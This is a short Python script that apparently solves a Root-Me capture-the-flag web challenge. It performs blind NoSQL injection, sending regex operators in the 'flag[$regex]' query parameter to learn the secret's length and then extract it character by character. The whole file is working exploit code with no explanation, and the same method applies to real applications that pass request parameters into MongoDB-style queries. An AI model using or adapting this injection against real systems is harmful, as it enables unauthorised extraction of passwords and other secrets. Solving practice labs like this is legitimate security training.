import requests, string
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
req = requests.session()

def countchar() -> int:
    for i in range(2,50):
        res = req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=%s'%(i*'.')).text
        if 'This is not a valid flag for the'  in res:    
            return i 

def findpassword( n : int) -> str:
    password = ''
    for _ in range(n):
        for c in arr:
            if 'Yeah this is the flag for' in req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^' + password + c).text:
                print('[+] ',password)
                password += c
                break
    return password


n = countchar()
print('length password ',n)
print(findpassword(n))
